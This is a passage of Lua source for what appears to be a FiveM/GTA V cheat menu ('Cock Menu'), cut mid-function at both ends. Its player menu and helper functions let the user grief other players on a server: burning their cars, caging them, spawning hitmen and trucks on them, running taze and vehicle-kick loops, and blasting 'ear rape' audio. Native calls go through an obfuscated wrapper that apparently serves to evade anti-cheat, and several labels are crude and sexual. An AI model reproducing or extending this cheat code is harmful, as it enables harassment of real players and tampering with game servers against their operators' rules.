                                   CockT.Global.isisattack(Fatasf.n.GetEntityCoords(GetPlayerPed(CockT.Global.SelectedPlayer)))
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Warp vehicle', 0.422, scroll, false, true) then
                                   CockT.Global.WarpVehicle(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('PP on head', 0.422, scroll, false, true) then
                                   CockT.Global.PPonHead(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Fuck player engine', 0.422, scroll, false, true) then
                                   CockT.Global.FuckPlayerEngine(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.025
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('SpaceX',0.425, scroll, Cock.Menu.LaunchPlayer, false) then
                                   Cock.Menu.LaunchPlayer = not Cock.Menu.LaunchPlayer
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('SpaceX2',0.425, scroll, Cock.Menu.SpaceX2, false) then
                                   Cock.Menu.SpaceX2 = not Cock.Menu.SpaceX2
                               end
                           end scroll = scroll + 0.005
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Spawn Hitman', 0.422, scroll, false, true) then
                                   CockT.Global.Hitman(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Give own army', 0.422, scroll, false, true) then
                                   CockT.Global.GivePlayerArmy(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Do gangbang', 0.422, scroll, false, true) then
                                   CockT.Global.DoGangbangPlayer(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Custom particle', 0.422, scroll, false, true) then
                                   CockT.Global.PlayCustompParticle(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.025
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Give player explosive ammo',0.425, scroll, Cock.Menu.giveexplosiveammo, false) then
                                   Cock.Menu.giveexplosiveammo = not Cock.Menu.giveexplosiveammo
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Give player molotov ammo',0.425, scroll, Cock.Menu.givemolotovammo, false) then
                                   Cock.Menu.givemolotovammo = not Cock.Menu.givemolotovammo
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Give player prop ammo',0.425, scroll, Cock.Menu.givepropammo, false) then
                                   Cock.Menu.givepropammo = not Cock.Menu.givepropammo
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Taze loop',0.425, scroll, Cock.Menu.tazeloop, false) then
                                   Cock.Menu.tazeloop = not Cock.Menu.tazeloop
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Kick from vehicle loop',0.425, scroll, Cock.Menu.kickfromveh, false) then
                                   Cock.Menu.kickfromveh = not Cock.Menu.kickfromveh
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Ear Rape',0.425, scroll, Cock.Menu.earrape, false) then
                                   Cock.Menu.earrape = not Cock.Menu.earrape
                               end
                           end scroll = scroll + 0.015
                           
                       end
                   end,
   
                   
                   BurnPlayerCar = function(player)
                       local gox_dict = "core"
                       Fatasf.n.RequestNamedPtfxAsset(gox_dict)					
                       while not Fatasf.n.HasNamedPtfxAssetLoaded(gox_dict) do						
                           CockT.Inv["Wait"](10)				
                       end
                       if Fatasf.n.IsPedSittingInVehicle(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), false)) then
                           Fatasf.n.UseParticleFxAsset(gox_dict)							
                           Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_petrol_fire",Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)),0,0,0,1.0,0,0,0)			
                       end 
                   end,
                   SetModelPls = function(model)
                       Fatasf.n.RequestModel(model)
                       while not Fatasf.n.HasModelLoaded(model) do
                           CockT.Inv["Wait"](1)
                       end
                       CockT.Inv["Invoke"](CockT.Natives['SetPlayerModel'], Fatasf.n.PlayerId(), Fatasf.n.GetHashKey(model))
                   end,
                   
                   SpawnBitch = function(playerped)
                       if Fatasf.n.IsPedSittingInVehicle(Fatasf.n.GetPlayerPed(playerped), Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(playerped), false)) then
                           local veh = Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.GetPlayerPed(playerped))
                           local model = Fatasf.n.GetHashKey("s_f_y_stripper_01")
                           Fatasf.n.RequestModel(model)
                           while not Fatasf.n.HasModelLoaded(model) do
                               CockT.Inv["Wait"](1)
                           end
                           local cpiv = Fatasf.n.CreatePedInsideVehicle(veh, 4, model, 0, true, false)
                           
                           end
                       end,
                   
                   
                   DragBar = function()
                       local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
                   local widht, height = Fatasf.n.GetActiveScreenResolution()
                   c_x = c_x / widht
                   c_y = c_y / height
   
                   if (c_x >= Cock.Menu.MenuX - 0.50 and c_y >= Cock.Menu.MenuY - 0.24 and c_x <= Cock.Menu.MenuX - 0.41 and c_y < Cock.Menu.MenuY - 0.23) and Fatasf.n.IsDisabledControlJustPressed(0, 24) then 
                           _x = Cock.Menu.MenuX - c_x
                           _y = Cock.Menu.MenuY - c_y
                           Cock.Menu.dragging_allowed = true
                       elseif CockT.Inv["Invoke"](CockT.Natives['IsDisabledControlReleased'], 0, 24) then
                           Cock.Menu.dragging_allowed = false
                       end
                       
                       if Cock.Menu.dragging_allowed then
                           Cock.Menu.MenuX = c_x + _x
                           Cock.Menu.MenuY = c_y + _y
                       end
   
   
                       if (c_x >= Cock.Menu.MenuX2 - 0.09 and c_y >= Cock.Menu.MenuY2 - 0.27 and c_x <= Cock.Menu.MenuX2 + 0.085 and c_y < Cock.Menu.MenuY2 - 0.155) and Fatasf.n.IsDisabledControlJustPressed(0, 24) then 
                           _x2 = Cock.Menu.MenuX2 - c_x
                           _y2 = Cock.Menu.MenuY2 - c_y
                           Cock.Menu.dragging_allowed2 = true
                       elseif CockT.Inv["Invoke"](CockT.Natives['IsDisabledControlReleased'], 0, 24) then
                           Cock.Menu.dragging_allowed2 = false
                       end
                       
   
                       if Cock.Menu.dragging_allowed2 then
                           Cock.Menu.MenuX2 = c_x + _x2
                           Cock.Menu.MenuY2 = c_y + _y2
                       end
   
                       
   
                   end,
   
                   DrawText = function(text, x, y, _outl, size, font, centre)
                       Fatasf.n.SetTextFont(0)
                       if _outl then
                           Fatasf.n.SetTextOutline(true)
                       end
                       if CockT.Math.tonumber(font) ~= nil then
                           Fatasf.n.SetTextFont(font)
                       end
                       Fatasf.n.SetTextCentre(centre)
                       Fatasf.n.SetTextScale(100.0, size or 0.23)
                       Fatasf.n.BeginTextCommandDisplayText("STRING")
                       Fatasf.n.AddTextComponentSubstringWebsite(text)
                       Fatasf.n.EndTextCommandDisplayText(x, y)
                   end,
                   TextWidht = function(str, font, scale)
                       Fatasf.n.BeginTextCommandWidth("STRING")
                       Fatasf.n.AddTextComponentString(str)
                       Fatasf.n.SetTextFont(font or 4)
                       Fatasf.n.SetTextScale(scale or 0.35, scale or 0.35)
                       local length = Fatasf.n.EndTextCommandGetWidth(1)
                   
                       return length
                   end,
                   SirensOnPlayer = function(player)
                       CockT.Inv['Thread'](function()
                           local kx = Fatasf.n.GetHashKey('police')
                           Fatasf.n.RequestModel(kx)
                           while not Fatasf.n.HasModelLoaded(kx) do 
                               CockT.Inv["Wait"](0) 
                           end
                           local k = Fatasf.n.CreateVehicle(kx, Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(player)), 1, 1, 1)
                           while true do
                               CockT.Inv["Wait"](0)
                               local PoliceAnnoying = true
                               if PoliceAnnoying then
                                   coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(player))
                                   Fatasf.n.SetEntityVisible(k, false, false)
                                   Fatasf.n.SetEntityCoords(k, coords.x, coords.y, coords.z + 5)
                                   Fatasf.n.SetVehicleEngineOn(k, true, true, true)
                                   Fatasf.n.TriggerSiren(k)
                                   Fatasf.n.SetVehicleSiren(k, true)
                               end
                           end
                       end)
                   end,
                   cockplate = function()
                       local car = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(),false)
                       if car ~= 0 then
                       CockT.Inv["Wait"](400)
                       Fatasf.n.SetVehicleNumberPlateText(car,"        C")
                       CockT.Inv["Wait"](400)
                       Fatasf.n.SetVehicleNumberPlateText(car,"       CO")
                       CockT.Inv["Wait"](400)
                       Fatasf.n.SetVehicleNumberPlateText(car,"      COC")
                       CockT.Inv["Wait"](400)
                       Fatasf.n.SetVehicleNumberPlateText(car,"     COCK")
                       CockT.Inv["Wait"](400)
                       Fatasf.n.SetVehicleNumberPlateText(car,"    COCK ")
                       CockT.Inv["Wait"](400)
                       Fatasf.n.SetVehicleNumberPlateText(car,"   COCK ")
                       CockT.Inv["Wait"](400)
                       Fatasf.n.SetVehicleNumberPlateText(car,"  COCK ")
                       CockT.Inv["Wait"](400)
                       Fatasf.n.SetVehicleNumberPlateText(car," COCK ")
                       CockT.Inv["Wait"](400)
                       Fatasf.n.SetVehicleNumberPlateText(car,"COCK M")
                       CockT.Inv["Wait"](400)
                       Fatasf.n.SetVehicleNumberPlateText(car,"OCK ME")
                       CockT.Inv["Wait"](400)
                       Fatasf.n.SetVehicleNumberPlateText(car,"CK MEN")
                       CockT.Inv["Wait"](400)
                       Fatasf.n.SetVehicleNumberPlateText(car,"K MENU")
                   end
                   end,
                   DrawBorderedRect = function(x, y, w, h, colour)
                       Fatasf.n.DrawRect(x, y - (h / 2), w, 0.001, colour.r, colour.g, colour.b, colour.a) 
                       Fatasf.n.DrawRect(x, y + (h / 2), w, 0.001, colour.r, colour.g, colour.b, colour.a) 
                       Fatasf.n.DrawRect((x - (w / 2)), y, 0.0005, h, colour.r, colour.g, colour.b, colour.a)  
                       Fatasf.n.DrawRect((x + (w / 2)), y, 0.0005, h, colour.r, colour.g, colour.b, colour.a) 
                   end,
                   ComboButton = function(text, x, y, _outl)
                       local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
                       local widht, height = Fatasf.n.GetActiveScreenResolution()
                       c_x = c_x / widht
                       c_y = c_y / height
                   
                       local text_widht = CockT.Global.GetTextWidht(text, 0, 0.2)
                   
                       Fatasf.n.DrawRect(x+0.025+drag_x2, y+0.01+drag_y2, 0.059, 0.022, 255, 255, 255, 255)
                       Fatasf.n.DrawRect(x+0.025+drag_x2, y+0.01+drag_y2, 0.058, 0.02, 34, 35, 40, 255)
       
                       if tab == id then
                       end
           
       
                       
                       drag_x2 = Cock.Menu.MenuX2-0.5
                       drag_y2 = Cock.Menu.MenuY2-0.5
                   
                       if( (c_x) + 0.013 >= x+drag_x2 and (c_x) - 0.03 <= x+drag_x2 and (c_y) + 0.01 >= y+drag_y2 and (c_y) - 0.005 <= y+drag_y2) then
                           Fatasf.n.SetTextColour(Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value, Cock.Sliders['MainA'].value)
                           CockT.Global.DrawText(text, x+drag_x2+0.012, y+drag_y2, _outl, 0.3, 4, false)
                       else
                           CockT.Global.DrawText(text, x+drag_x2+0.012, y+drag_y2, _outl, 0.3, 4, false)
                       end
       
                       if( (c_x) + 0.013 >= x+drag_x2 and (c_x) - 0.03 <= x+drag_x2 and (c_y) + 0.01 >= y+drag_y2 and (c_y) - 0.005 <= y+drag_y2) and Fatasf.n.IsDisabledControlJustReleased(0, 92) then 
                           return true
                       else
                           return false
                       end
                   end,
                   OnlineButton = function(x, y, _outl, id, name)
                       local x = x+drag_x2
                       local y = y+drag_y2
                       CockT.Global.DrawText("ID: "..id.." | "..name, x, y-0.01, _outl, 0.3, 4, true)
                       local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
                       local widht, height = Fatasf.n.GetActiveScreenResolution()
                       c_x = c_x / widht
                       c_y = c_y / height
                   
                       if name == Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer) then
                           Fatasf.n.DrawRect(x, y, 0.1, 0.017, 35, 35, 35, 255)
                       else
                           Fatasf.n.DrawRect(x, y, 0.1, 0.017, 15, 15, 15, 255)
                       end
                   
                       if( (c_x) + 0.03 >= x and (c_x) - 0.03 <= x and (c_y) + 0.012 >= y and (c_y) - 0.012 <= y and Fatasf.n.IsDisabledControlJustReleased(0, 92)) then 
                           return true
                       else
                           return false
                       end
                   end,
                   
                   
                   
                  DriveToWaypoint = function() --['PlayerPedId']
                       local vehicle =Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId())
                       local maxspeed =  Functions.f.CustomInput("Max Speed ~g~(KM/H)", '', 5)
           
                               if Fatasf.n.DoesEntityExist(vehicle) then
           
                                   local coords = Fatasf.n.GetBlipInfoIdCoord(Fatasf.n.GetFirstBlipInfoId(8))
           
                                   Fatasf.n.TaskVehicleDriveToCoord(Fatasf.n.PlayerPedId(), vehicle, coords, GetVehicleMaxSpeed(vehicle), 0, -1848994066, 263100, 10.0)
           
                                   Fatasf.n.SetDriveTaskDrivingStyle(Fatasf.n.PlayerPedId(), 263100)       
           
                                   Fatasf.n.SetPedKeepTask(Fatasf.n.PlayerPedId(), true)
           
                                   while Cock.Menu.DriveToWaypoint do
                                       CockT.Inv["Wait"](0)
           
                                       Fatasf.n.SetEntityMaxSpeed(vehicle, (maxspeed + 1) / 3.6)
           
                                       if Fatasf.n.GetPedInVehicleSeat(vehicle, -1) == Fatasf.n.PlayerPedId() then
           
                                           if Fatasf.n.GetDistanceBetweenCoords(coords, Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), false) <= 25.0 then
                                               Cock.Menu.DriveToWaypoint = false
                                               Fatasf.n.ClearPedTasks(Fatasf.n.PlayerPedId())
                                               Fatasf.n.ClearPedSecondaryTask(Fatasf.n.PlayerPedId())
                                           end
                                       else
                                           Cock.Menu.DriveToWaypoint = false
                                       end
                                   end
                                           Fatasf.n.ClearPedTasks(Fatasf.n.PlayerPedId())
                                           Fatasf.n.ClearPedSecondaryTask(Fatasf.n.PlayerPedId())
           
                                           Fatasf.n.SetEntityMaxSpeed(vehicle, GetVehicleMaxSpeed(vehicle))
           
                                           end
                   end,
                  
                   RGBPicker = function(okv)
                       
       
                       if Cock.Menu.MenuX2 < 0.9 then
                           Cock.Menu.MenuX2 = Cock.Menu.MenuX2 + 0.001
                       end
                       if PEnabled then
                       CockT.Global.Dmovement(true)
                       Fatasf.n.DrawRect(0.49, 0.5, 0.141, 0.251, Red, Green, Blue, 255)
                       Fatasf.n.DrawRect(0.49, 0.5, 0.14, 0.25, 19, 20, 22, 255)
           
                       if CockT.RGBPicker['Style'].value == 'orange-red-yellow' then
                           Red = 150
                           Green = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                           Blue = 0
                           colour = 1
                           for i = 1, 110 do
                               Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, 150,CockT.Math.floor(colour / 0.8), 0, 255)
                               colour = colour + 2
                           end
                       elseif CockT.RGBPicker['Style'].value == 'blue-black' then
                           Red = 0
                           Green = 0
                           Blue = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 2)
                           colour = 1
                           for i = 1, 110 do
                               Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, 0, 0,CockT.Math.floor(colour / 2), 255)
                               colour = colour + 2
                           end
                       elseif CockT.RGBPicker['Style'].value == 'red-black' then
                           Red = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                           Green = 0
                           Blue = 0
                           colour = 1
                           for i = 1, 110 do
                               Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2,CockT.Math.floor(colour / 0.8), 0, 0, 255)
                               colour = colour + 2
                           end
                       elseif CockT.RGBPicker['Style'].value == 'yellow-black' then
                           Red = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                           Green = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                           Blue = 0
                           colour = 1
                           for i = 1, 110 do
                               Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2,CockT.Math.floor(colour / 0.8),CockT.Math.floor(colour / 0.8), 0, 255)
                               colour = colour + 2
                           end
                       elseif CockT.RGBPicker['Style'].value == 'aqua-black' then
                           Red = 0
                           Green = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                           Blue = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                           colour = 1
                           for i = 1, 110 do
                               Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, 0,CockT.Math.floor(colour / 0.8),CockT.Math.floor(colour / 0.8), 255)
                               colour = colour + 2
                           end
                       elseif CockT.RGBPicker['Style'].value == 'green-black' then
                           Red = 0
                           Green = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                           Blue = 0
                           colour = 1
                           for i = 1, 110 do
                               Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, 0, colour, 0, 255)
                               colour = colour + 2
                           end
                       elseif CockT.RGBPicker['Style'].value == 'white-black' then
                           Red = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                           Green = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                           Blue = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                           colour = 1
                           for i = 1, 110 do
                               Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, colour, colour, colour, 255)
                               colour = colour + 2
                           end
                       elseif CockT.RGBPicker['Style'].value == 'pink-orange' then
                           Red = 255
                           Green = 51
                           Blue = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                           colour = 1
                           for i = 1, 110 do
                               Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, 255, 51, colour, 255)
                               colour = colour + 2
                           end
                       elseif CockT.RGBPicker['Style'].value == 'green-black' then
                           Red = 0
                           Green = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                           Blue = 0
                           colour = 1
                           for i = 1, 110 do
                               Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, 0, colour, 0, 255)
                               colour = colour + 2
                           end
                       elseif CockT.RGBPicker['Style'].value == 'pink-dblue' then
                           Red = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                           Green = 15
                           Blue = 55
                           colour = 1
                           for i = 1, 110 do
                               Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, colour, 15, 55, 255)
                               colour = colour + 2
                           end
                       end
           
                       if ShowList then
                           
           
                           Fatasf.n.DrawRect(0.49, 0.462, 0.14, 0.174, 25, 25, 25, 255)
                           Fatasf.n.DrawRect(0.49, 0.55, 0.14, 0.000925, Red, Green, Blue, 255)
                           
                           if CockT.Global.RGButton('', 0.443, 0.42, false, 255, 100, 0) then
                               CockT.RGBPicker['Style'].value = 'orange-red-yellow'
                           end
                           if CockT.Global.RGButton('', 0.46, 0.42, false, 0, 0, 255) then
                               CockT.RGBPicker['Style'].value = 'blue-black'
                           end
                           if CockT.Global.RGButton('', 0.478, 0.42, false, 255, 0, 0) then
                               CockT.RGBPicker['Style'].value = 'red-black'
                           end
                           if CockT.Global.RGButton('', 0.495, 0.42, false, 255, 242, 0) then
                               CockT.RGBPicker['Style'].value = 'yellow-black'
                           end
                           if CockT.Global.RGButton('', 0.512, 0.42, false, 0, 193, 193) then
                               CockT.RGBPicker['Style'].value = 'aqua-black'
                           end
                           if CockT.Global.RGButton('', 0.529, 0.42, false, 0, 204, 0) then
                               CockT.RGBPicker['Style'].value = 'green-black'
                           end
           
                           --next line
           
                           if CockT.Global.RGButton('', 0.443, 0.445, false, 222, 222, 222) then
                               CockT.RGBPicker['Style'].value = 'white-black'
                           end
                           if CockT.Global.RGButton('', 0.46, 0.445, false, 255, 51, 204) then
                               CockT.RGBPicker['Style'].value = 'pink-orange'
                           end
                           if CockT.Global.RGButton('', 0.478, 0.445, false, 227, 15, 55) then
                               CockT.RGBPicker['Style'].value = 'pink-dblue'
                           end
                       else
                           CockT.Global.PickerS(0.5, 0.5, CockT.RGBPicker.value)
                       end
                   
                       Fatasf.n.DrawRect(0.4, 0.5, 0.0173, 0.251, Red, Green, Blue, 255)
                       Fatasf.n.DrawRect(0.4, 0.5, 0.017, 0.25, 19, 20, 22, 255)
           
       
                       
                       CockT.Global.SliderAlpha(0.4, 0.5, CockT.RGBPicker['Alpha'])
                       Alpha = CockT.RGBPicker['Alpha'].value
                       Fatasf.n.DrawRect(0.49, 0.3495, 0.141, 0.027, Red, Green, Blue, 255)
                       Fatasf.n.DrawRect(0.49, 0.35, 0.14, 0.025, 19, 20, 22, 255)
                       Functions.f.DrawTextTest('RGBA: '..Red..', '..Green..', '..Blue..', '..Alpha, false, 0.35, 0, 0.46, 0.336)
                       Fatasf.n.DrawRect(0.552, 0.3495, 0.015, 0.023, Red, Green, Blue, 255)
                   
           
                       Functions.f.DrawTextTest('Colour:', false, 0.35, 0, 0.53, 0.336)
                   
                       if CockT.Global.ListButton(0.552, 0.3495, false, 129, 255, 0) then
                           ShowList = not ShowList
                       end
                       Functions.f.DrawTextTest('Click [`Enter`] to save', false, 0.3, 0, 0.49, 0.375)
                       Functions.f.DrawTextTest('Click function again, to quit from picker', false, 0.3, 0, 0.49, 0.6)
                   
           
                   if Fatasf.n.IsDisabledControlPressed(0, 191) then
                       Rv2 = Red
                       Gv2 = Green
                       Bv2 = Blue
                       Av2 = Alpha
                   end end  end,
   
                   TpToWaypoint = function()
                       wp = Fatasf.n.GetFirstBlipInfoId(8)
                       if Fatasf.n.DoesBlipExist(wp) then          
                           wpC = Fatasf.n.GetBlipInfoIdCoord(wp)       
                           for cc = 1, 1000 do            
                               CockT.Inv["Invoke"](CockT.Natives['SetPedCoordsKeepVehicle'], Fatasf.n.PlayerPedId(), wpC["x"], wpC["y"], cc + 0.0)            
                               gZ, zPos = Fatasf.n.GetGroundZFor_3dCoord(wpC["x"], wpC["y"], cc + 0.0)            
                               if gZ then                
                                   CockT.Inv["Invoke"](CockT.Natives['SetPedCoordsKeepVehicle'], Fatasf.n.PlayerPedId(), wpC["x"], wpC["y"], cc + 0.0)                
                                   break            
                               end            
                               CockT.Inv["Wait"](0)
                           end
                       end
                   end,
                   EnableAllEngines = function()
                       for vehicle in Fatasf.n.EnumerateVehicles() do
                            Fatasf.n.SetVehicleEngineOn(vehicle, true, true, true)
                       end
                   end,
                   EnableAllSirens = function()
                       for vehicle in Fatasf.n.EnumerateVehicles() do
                           Fatasf.n.SetVehicleEngineOn(vehicle, true, true, true)
                            Fatasf.n.TriggerSiren(vehicle)
                            Fatasf.n.SetVehicleSiren(vehicle, true)
                       end
                   end,
                   TugAllPlayers = function()
                      for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local ped = Fatasf.n.GetPlayerPed(i) 
                           coords = Fatasf.n.GetEntityCoords(ped)
                           while not Fatasf.n.HasModelLoaded(Fatasf.n.GetHashKey("tug")) do
                               Fatasf.n.RequestModel(Fatasf.n.GetHashKey("tug"))
                               CockT.Inv["Wait"](1)
                           end
                           local veh = Fatasf.n.CreateVehicle(Fatasf.n.GetHashKey("tug"), coords.x, coords.y, coords.z, 90.0, 1, 1)
                       end
                   end,
                   killallpeds = function()
                       for peds in Fatasf.n.EnumeratePeds() do
                           if
                               Fatasf.n.IsPedAPlayer(peds) ~= true and
                                   peds ~= Fatasf.n.PlayerPedId()
                            then
                               Fatasf.n.RequestControlOnce(peds)
                               Fatasf.n.SetEntityHealth(peds, 0)
                           end
                       end
                   end,
   
                   PounderPlayers = function(players, howm)
                       for i = 0, howm - 1 do
                           local ped = Fatasf.n.GetPlayerPed(players)
                           local coords = Fatasf.n.GetEntityCoords(ped)
                           while not Fatasf.n.HasModelLoaded(Fatasf.n.GetHashKey("Pounder")) do
                           Fatasf.n.RequestModel(Fatasf.n.GetHashKey("Pounder"))
                           CockT.Inv["Wait"](1)
                           end
                           local veh = Fatasf.n.CreateVehicle(Fatasf.n.GetHashKey("Pounder"), coords.x, coords.y, coords.z, 90.0, 1, 1)
                       end
                   end,
                   FormatCoord = function(coord)
                       if coord == nil then
                           return "unknown"
                       end
                   
                       return CockT.Math.tonumber(CockT.Strings.format("%.2f", coord))
                   end,
                   
                   Cage = function(player)
                       local ped = Fatasf.n.GetPlayerPed(player)
                       local coords = Fatasf.n.GetEntityCoords(ped)
                       local inveh = Fatasf.n.IsPedInAnyVehicle(ped)
                       if inveh then
                           obj =
                               Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                               coords.x - 6.8,
                               coords.y + 1,
                               coords.z - 1.5,
                               0,
                               1,
                               1
                           )
                           Fatasf.n.SetEntityHeading(obj, 90.0)
                           Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                               coords.x - 0.6,
                               coords.y + 6.8,
                               coords.z - 1.5,
                               0,
                               1,
                               1
                           )
                           Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                               coords.x - 0.6,
                               coords.y - 4.8,
                               coords.z - 1.5,
                               0,
                               1,
                               1
                           )
                           obj2 =
                               Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                               coords.x + 4.8,
                               coords.y + 1,
                               coords.z - 1.5,
                               0,
                               1,
                               1
                           )
                           Fatasf.n.SetEntityHeading(obj2, 90.0)
                           obj =
                               Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                               coords.x - 6.8,
                               coords.y + 1,
                               coords.z + 1.3,
                               0,
                               1,
                               1
                           )
                           Fatasf.n.SetEntityHeading(obj, 90.0)
                           Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                               coords.x - 0.6,
                               coords.y + 6.8,
                               coords.z + 1.3,
                               0,
                               1,
                               1
                           )
                           Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                               coords.x - 0.6,
                               coords.y - 4.8,
                               coords.z + 1.3,
                               0,
                               1,
                               1
                           )
                           obj2 =
                               Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                               coords.x + 4.8,
                               coords.y + 1,
                               coords.z + 1.3,
                               0,
                               1,
                               1
                           )
                           Fatasf.n.SetEntityHeading(obj2, 90.0)
                       else
                           obj =
                               Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                               coords.x - 0.6,
                               coords.y - 1,
                               coords.z - 1,
                               1,
                               1,
                               1
                           )
                           Fatasf.n.FreezeEntityPosition(obj, true)
                           obj2 =
                               Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                               coords.x - 0.55,
                               coords.y - 1.05,
                               coords.z - 1,
                               1,
                               1,
                               1
                           )
                           Fatasf.n.SetEntityHeading(obj2, 90.0)
                           Fatasf.n.FreezeEntityPosition(obj2, true)
                           obj3 =
                               Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                               coords.x - 0.6,
                               coords.y + 0.6,
                               coords.z - 1,
                               1,
                               1,
                               1
                           )
                           Fatasf.n.FreezeEntityPosition(obj3, true)
                           obj4 =
                               Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                               coords.x + 1.05,
                               coords.y - 1.05,
                               coords.z - 1,
                               1,
                               1,
                               1
                           )
                           Fatasf.n.SetEntityHeading(obj4, 90.0)
                           Fatasf.n.FreezeEntityPosition(obj4, true)
                           obj5 =
                               Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                               coords.x - 0.6,
                               coords.y - 1,
                               coords.z + 1.5,
                               1,
                               1,
                               1
                           )
                           Fatasf.n.FreezeEntityPosition(obj5, true)
                           obj6 =
                               Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                               coords.x - 0.55,
                               coords.y - 1.05,
                               coords.z + 1.5,
                               1,
                               1,
                               1
                           )
                           Fatasf.n.SetEntityHeading(obj6, 90.0)
                           Fatasf.n.FreezeEntityPosition(obj6, true)
                           obj7 =
                               Fatasf.n.CreateObject(
                               Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                               coords.x - 0.6,
